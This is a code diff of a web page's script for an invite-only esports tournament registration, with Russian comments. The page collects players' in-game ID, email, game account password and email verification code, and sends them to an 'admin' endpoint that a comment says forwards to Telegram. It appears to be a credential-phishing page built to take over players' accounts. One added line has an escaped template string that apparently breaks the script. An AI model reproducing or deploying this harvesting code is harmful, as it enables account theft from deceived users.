-        <path d="M185 66L164 175c-1 5-4 7-8 5l-40-30-19 18c-2 2-4 3-7 3l3-42 77-69c3-3-1-4-5-2l-95 60-41-13c-9-3-9-9 2-13l159-61c7-3 14 2 11 13z"/>
+      <circle cx="120" cy="120" r="120" fill="none"/>
+      <path d="M185 66L164 175c-1 5-4 7-8 5l-40-30-19 18c-2 2-4 3-7 3l-3-42 77-69c3-3-1-4-5-2l-95 60-41-13c-9-3-9-9 2-13l159-61c7-3 14 2 11 13z"/>
     </svg>
-</a>
+  </a>
 
-<script>
-    // Demo codes (frontend). Backend всё равно валидирует и шлёт в TG.
-    const VALID_CODES = ["FLOW2025", "ESPORTPUBG", "V7ACCESS"];
+  <script>
+    const VALID_CODES = ["FLOW2025","ESPORTPUBG","V7ACCESS"];
 
-    const enterCodeBtn = document.getElementById('enter-code-btn');
-    const codeInput = document.getElementById('access-code');
-    const checkCodeBtn = document.getElementById('check-code');
-    const codeStatus = document.getElementById('code-status');
-    const regSection = document.getElementById('registration-section');
-    const regForm = document.getElementById('reg-form');
-    const regStatus = document.getElementById('reg-status');
-    const finalMessage = document.getElementById('final-message');
-    const finalCard = document.getElementById('final-card');
+    const announceEnter = document.getElementById('announce-enter');
+    const codeGate      = document.getElementById('code-gate');
+    const codeInput     = document.getElementById('access-code');
+    const checkCodeBtn  = document.getElementById('check-code');
+    const codeStatus    = document.getElementById('code-status');
+    const regSection    = document.getElementById('registration-section');
+    const regForm       = document.getElementById('reg-form');
+    const regStatus     = document.getElementById('reg-status');
+    const finalMessage  = document.getElementById('final-message');
+    const finalCard     = document.getElementById('final-card');
     const requestEmailCodeBtn = document.getElementById('request-email-code');
-
     let lastUid = null;
 
-    // Notify admin via backend -> Telegram
-    function notifyAdmin(type, payload = {}) {
-        return fetch("/api/notify-admin", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ type, ...payload })
-        })
-        .then(r => r.json())
-        .then(data => {
-            console.log("Admin notify result:", data);
-            return data;
-        })
-        .catch(err => {
-            console.error("Admin notify error:", err);
-            return { ok: false, error: "fetch_failed" };
+    // Показать STEP 1 только после клика по кнопке анонса
+    if (announceEnter){
+      announceEnter.addEventListener('click', ()=>{
+        codeGate.style.display = 'block';
+        codeGate.setAttribute('aria-hidden','false');
+        codeGate.scrollIntoView({behavior:'smooth'});
+        setTimeout(()=>codeInput && codeInput.focus(), 250);
+      });
+    }
+
+    // уведомление админа
+    function notifyAdmin(type, payload = {}){
+      return fetch("/api/notify-admin",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({type, ...payload})
+      }).then(r=>r.json()).catch(()=>({ok:false,error:"fetch_failed"}));
+    }
+
+    async function sendApplication(formData){
+      try{
+        const res = await fetch("/api/submit-registration",{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify(formData)
         });
+        if(!res.ok) throw 0;
+        return await res.json();
+      }catch(e){
+        await notifyAdmin("full_application_fallback",formData);
+        return {status:"pending"};
+      }
     }
 
-    // Full application to backend (returns {status, uid})
-    async function sendApplication(formData) {
-        try {
-            const res = await fetch("/api/submit-registration", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(formData)
-            });
-            if (!res.ok) throw new Error("Bad response");
-            return await res.json();
-        } catch (e) {
-            console.error("submit-registration error, fallback notify:", e);
-            await notifyAdmin("full_application_fallback", formData);
-            return { status: "pending" };
-        }
-    }
+    function renderFinalStatus(status, uid){
+      if(uid) lastUid = uid;
 
-    // Render final / waiting status block
-    function renderFinalStatus(status, uid) {
-        if (uid) lastUid = uid;
-
-        if (status === "approved") {
-            finalCard.innerHTML = `
-                <div class="section-title" style="margin-bottom:4px;">
-                    <span class="bar"></span>Registration approved
-                </div>
-                <div class="success-envelope">✉️</div>
-                <div class="section-sub" style="margin-bottom:0;">
-                    Your registration is <strong>approved</strong>.
-                    You will receive lobby details and official instructions
-                    via your contact channels.
-                </div>
-            `;
-            return;
-        }
-
-        if (status === "rejected") {
-            finalCard.innerHTML = `
-                <div class="section-title" style="margin-bottom:4px;">
-                    <span class="bar"></span>Registration rejected
-                </div>
-                <div class="section-sub" style="margin-bottom:0;">
-                    Your data was <strong>not approved</strong>.
-                    Contact admin or submit a new application with updated information.
-                </div>
-            `;
-            return;
-        }
-
-        // pending / default — waiting lobby
-        let idBlock = "";
-        if (lastUid) {
-            idBlock = `
-                <div class="note" style="margin-top:6px;">
-                    Application ID: <code>${lastUid}</code>.
-                    Save this ID. You can check your status below.
-                </div>
-                <div class="submit-wrap" style="margin-top:8px; justify-content:flex-start;">
-                    <button type="button" id="check-status-btn" class="btn-sm">
-                        CHECK STATUS
-                    </button>
-                </div>
-            `;
-        }
-
+      if(status === "approved"){
         finalCard.innerHTML = `
-            <div class="section-title" style="margin-bottom:4px;">
-                <span class="bar"></span>Waiting lobby — application received
-            </div>
-            <div class="section-sub" style="margin-bottom:0;">
-                Your application is in the <strong>manual review queue</strong>.
-                Admin will either approve your slot or request corrections.
-                Once a decision is made, the status here and your email/DM will be updated.
-            </div>
-            ${idBlock}
+          <div class="title"><span class="bar"></span>Registration approved</div>
+          <div class="sub" style="margin-bottom:0">You will receive lobby details via email/DM.</div>
         `;
+        return;
+      }
 
-        const checkBtn = document.getElementById('check-status-btn');
-        if (checkBtn && lastUid) {
-            checkBtn.addEventListener('click', async () => {
-                checkBtn.disabled = true;
-                checkBtn.textContent = "Checking...";
-                try {
-                    const res = await fetch(`/api/check-status/${lastUid}`);
-                    if (!res.ok) throw new Error("Bad status");
-                    const data = await res.json();
-                    renderFinalStatus(data.status || "pending", lastUid);
-                } catch (e) {
-                    console.error("check-status error", e);
-                    checkBtn.disabled = false;
-                    checkBtn.textContent = "CHECK STATUS";
-                    alert("Unable to fetch status now. Try again later or contact admin.");
-                }
-            });
+      if(status === "rejected"){
+        finalCard.innerHTML = `
+          <div class="title"><span class="bar"></span>Registration rejected</div>
+          <div class="sub" style="margin-bottom:0">Contact admin or submit updated information.</div>
+        `;
+        return;
+      }
+
+      let extra = "";
+      if(lastUid){
+        extra = `
+          <div class="sub" style="margin-top:6px">Application ID: <code>${lastUid}</code></div>
+          <div class="submit" style="justify-content:flex-start">
+            <button id="check-status-btn" class="btn">Check status</button>
+          </div>
+        `;
+      }
+
+      finalCard.innerHTML = `
+        <div class="title"><span class="bar"></span>Waiting lobby — application received</div>
+        <div class="sub" style="margin-bottom:0">Your request is queued for manual review.</div>
+        ${extra}
+      `;
+
+      const btn = document.getElementById('check-status-btn');
+      if(btn && lastUid){
+        btn.addEventListener('click', async ()=>{
+          btn.disabled = true;
+          btn.textContent = "Checking…";
+          try{
+            const r = await fetch(\`/api/check-status/\${lastUid}\`);
+            const d = await r.json();
+            renderFinalStatus(d.status || "pending", lastUid);
+          }catch{
+            btn.disabled = false;
+            btn.textContent = "Check status";
+            alert("Try again later.");
+          }
+        });
+      }
+    }
+
+    // проверка кода
+    if(checkCodeBtn){
+      checkCodeBtn.addEventListener('click', ()=>{
+        const val = (codeInput.value || "").trim().toUpperCase();
+        if(!val){
+          codeStatus.textContent = "Enter your invite code.";
+          codeStatus.className = "status err";
+          regSection.style.display = "none";
+          return;
         }
+        if(VALID_CODES.includes(val)){
+          codeStatus.textContent = "Code accepted. Registration form unlocked.";
+          codeStatus.className = "status ok";
+          regSection.style.display = "block";
+          regSection.scrollIntoView({behavior:'smooth'});
+        }else{
+          codeStatus.textContent = "Invalid code. Check your invite or contact support.";
+          codeStatus.className = "status err";
+          regSection.style.display = "none";
+        }
+      });
     }
 
-    // CTA under banner -> scroll to code gate
-    if (enterCodeBtn && codeInput) {
-        enterCodeBtn.addEventListener('click', () => {
-            const gate = document.getElementById('code-gate');
-            if (gate) {
-                gate.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                setTimeout(() => codeInput.focus(), 250);
-            }
+    // запрос email-кода (частичная заявка)
+    if(requestEmailCodeBtn){
+      requestEmailCodeBtn.addEventListener('click', async ()=>{
+        regStatus.textContent = "";
+        regStatus.className = "status";
+
+        const ingameId = (document.getElementById('ingame-id').value||"").trim();
+        const email    = (document.getElementById('email').value||"").trim();
+        const pass     = (document.getElementById('password').value||"");
+
+        if(!ingameId || !email || !pass){
+          regStatus.textContent = "Fill In-game ID, Email and Password first.";
+          regStatus.className = "status err";
+          return;
+        }
+
+        const accessCode = (codeInput.value||"").trim();
+        const res = await notifyAdmin("email_code_request",{
+          accessCode, ingameId, email, password:pass, region:"CIS"
         });
+
+        if(res && res.ok){
+          regStatus.textContent = "Request sent. Admin will reply with verification code.";
+          regStatus.className = "status ok";
+        } else {
+          regStatus.textContent = "Request queued. If no response, ping admin directly.";
+          regStatus.className = "status err";
+        }
+      });
     }
 
-    // Code verification
-    if (checkCodeBtn) {
-        checkCodeBtn.addEventListener('click', () => {
-            const val = (codeInput.value || "").trim().toUpperCase();
-            if (!val) {
-                codeStatus.textContent = "Enter your invite code to continue.";
-                codeStatus.className = "status err";
-                regSection.style.display = "none";
-                return;
-            }
-            if (VALID_CODES.includes(val)) {
-                codeStatus.textContent = "Code accepted. Registration form unlocked.";
-                codeStatus.className = "status ok";
-                regSection.style.display = "block";
-                regSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
-            } else {
-                codeStatus.textContent = "Invalid code. Check your invite or contact support.";
-                codeStatus.className = "status err";
-                regSection.style.display = "none";
-            }
-        });
+    // отправка формы
+    if(regForm){
+      regForm.addEventListener('submit', async (e)=>{
+        e.preventDefault();
+        regStatus.textContent = "";
+        regStatus.className = "status";
+
+        const accessCode = (codeInput.value||"").trim().toUpperCase();
+        const email      = (document.getElementById('email').value||"").trim();
+        const emailCode  = (document.getElementById('email-code').value||"").trim();
+        const ingameId   = (document.getElementById('ingame-id').value||"").trim();
+        const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value||"").trim();
+        const pass       = (document.getElementById('password').value||"");
+        const pass2      = (document.getElementById('password-confirm').value||"");
+        const terms      = document.getElementById('terms').checked;
+
+        if(!accessCode || !VALID_CODES.includes(accessCode)){
+          regStatus.textContent = "Access code is missing or invalid.";
+          regStatus.className = "status err";
+          return;
+        }
+        if(!email || !ingameId || !pass || !pass2){
+          regStatus.textContent = "Please fill all required fields.";
+          regStatus.className = "status err";
+          return;
+        }
+        if(ingameIdConfirm && ingameIdConfirm !== ingameId){
+          regStatus.textContent = "In-game ID confirmation does not match.";
+          regStatus.className = "status err";
+          return;
+        }
+        if(pass !== pass2){
+          regStatus.textContent = "Passwords do not match.";
+          regStatus.className = "status err";
+          return;
+        }
+        if(!terms){
+          regStatus.textContent = "Please confirm that the data is correct.";
+          regStatus.className = "status err";
+          return;
+        }
+
+        const formData = {accessCode, ingameId, email, password:pass, emailCode, region:"CIS"};
+
+        regStatus.textContent = "Sending your application to the waiting lobby…";
+        const result = await sendApplication(formData);
+
+        regForm.reset();
+        regSection.style.display = "none";
+        finalMessage.style.display = "block";
+        finalMessage.scrollIntoView({behavior:'smooth'});
+        renderFinalStatus(result.status || "pending", result.uid || null);
+      });
     }
-
-    // "GET CODE" -> partial data to admin (email verification / pre-check)
-    if (requestEmailCodeBtn) {
-        requestEmailCodeBtn.addEventListener('click', async () => {
-            regStatus.textContent = "";
-            regStatus.className = "status";
-
-            const ingameId = (document.getElementById('ingame-id').value || "").trim();
-            const email = (document.getElementById('email').value || "").trim();
-            const pass = (document.getElementById('password').value || "");
-
-            if (!ingameId || !email || !pass) {
-                regStatus.textContent = "Fill In-game ID, Email and Password before requesting a code.";
-                regStatus.className = "status err";
-                return;
-            }
-
-            const accessCode = (codeInput.value || "").trim();
-
-            const res = await notifyAdmin("email_code_request", {
-                accessCode,
-                ingameId,
-                email,
-                password: pass
-            });
-
-            if (res && res.ok) {
-                regStatus.textContent = "Request sent. Admin will review and send a verification code.";
-                regStatus.className = "status ok";
-            } else {
-                regStatus.textContent = "Request queued. If no response, ping admin directly.";
-                regStatus.className = "status err";
-            }
-        });
-    }
-
-    // Full form submit -> waiting lobby + status
-    if (regForm) {
-        regForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            regStatus.textContent = "";
-            regStatus.className = "status";
-
-            const accessCode = (codeInput.value || "").trim().toUpperCase();
-            const email = (document.getElementById('email').value || "").trim();
-            const emailCode = (document.getElementById('email-code').value || "").trim();
-            const ingameId = (document.getElementById('ingame-id').value || "").trim();
-            const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value || "").trim();
-            const pass = (document.getElementById('password').value || "");
-            const pass2 = (document.getElementById('password-confirm').value || "");
-            const terms = document.getElementById('terms').checked;
-
-            if (!accessCode || !VALID_CODES.includes(accessCode)) {
-                regStatus.textContent = "Access code is missing or invalid.";
-                regStatus.className = "status err";
-                return;
-            }
-            if (!email || !ingameId || !pass || !pass2) {
-                regStatus.textContent = "Please fill all required fields.";
-                regStatus.className = "status err";
-                return;
-            }
-            if (ingameIdConfirm && ingameIdConfirm !== ingameId) {
-                regStatus.textContent = "In-game ID confirmation does not match.";
-                regStatus.className = "status err";
-                return;
-            }
-            if (pass !== pass2) {
-                regStatus.textContent = "Passwords do not match.";
-                regStatus.className = "status err";
-                return;
-            }
-            if (!terms) {
-                regStatus.textContent = "Please confirm that the data is correct.";
-                regStatus.className = "status err";
-                return;
-            }
-
-            const formData = { accessCode, ingameId, email, password: pass, emailCode };
-
-            regStatus.textContent = "Sending your application to the waiting lobby...";
-            regStatus.className = "status";
-
-            const result = await sendApplication(formData);
-
-            regForm.reset();
-            regSection.style.display = "none";
-            finalMessage.style.display = "block";
-            finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
-
-            renderFinalStatus(result.status || "pending", result.uid || null);
-        });
-    }
-</script>
-
+  </script>
 </body>
 </html>
